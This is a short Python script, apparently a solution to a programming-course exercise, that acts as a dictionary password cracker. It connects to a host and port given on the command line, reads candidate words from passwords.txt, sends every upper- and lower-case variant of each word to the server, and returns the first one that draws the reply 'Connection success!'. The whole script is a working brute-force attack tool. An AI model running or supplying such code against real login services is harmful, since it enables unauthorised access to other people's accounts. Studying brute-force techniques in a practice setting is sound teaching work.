# write your code here
import sys, socket, string, itertools, pathlib


current_path = pathlib.Path(__file__).parent.absolute()

args = sys.argv
# args = [' ', '127.0.0.1', '9090']
hostname = args[1]
port = int(args[2])

def pwd_crack(hostname, port):
    soc = socket.socket()
    soc.connect((hostname, port))

    file = open(current_path / "passwords.txt")

    bin_list = [0, 1]



    while True:
        for line in file:
            wd = list(line.strip())
            copy_wd = wd[:]
            len_wd= len(wd)
            for comb in itertools.product(bin_list, repeat=len_wd):
                i = 0
                for bit in comb:
                    if bit:
                        wd[i] = wd[i].upper()
                    i += 1

                pwd = "".join(wd)
                soc.send(pwd.encode())
                resp = soc.recv(1024).decode()
                if resp == "Connection success!":
                    soc.close()
                    file.close()
                    return pwd
                wd = copy_wd[:]



print(pwd_crack(hostname, port))